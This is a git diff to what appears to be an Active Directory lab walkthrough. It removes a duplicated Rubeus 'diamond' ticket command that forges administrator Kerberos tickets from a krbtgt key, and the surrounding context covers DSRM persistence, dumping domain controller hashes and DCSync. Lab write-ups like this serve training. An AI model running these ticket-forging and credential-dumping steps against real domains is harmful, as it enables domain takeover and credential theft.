@@ -423,15 +423,6 @@ C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f928438
 ```
 and now you can user win-rs to execute commands
 ### **FLAG 20 - Name of the Registry key modified to change Logon behavior of DSRM administrator**
-- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
-Use Rubeus and the krbtgt credentials to create a Diamond Ticket
-```Cmd
-C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-and now you can user win-rs to execute commands
-- Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
-
-
 To persistence on dcorp-dc we can abuse the DSRM service.
 Firtsly dump the hashes from the dc
 Open a session on the dc
@@ -510,4 +501,5 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchSco
 ```
 It doesn't return nothing, so we don't have priviledge
 *add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user*
-Crate a session with a domain
+Crate a session with a domain admin
+
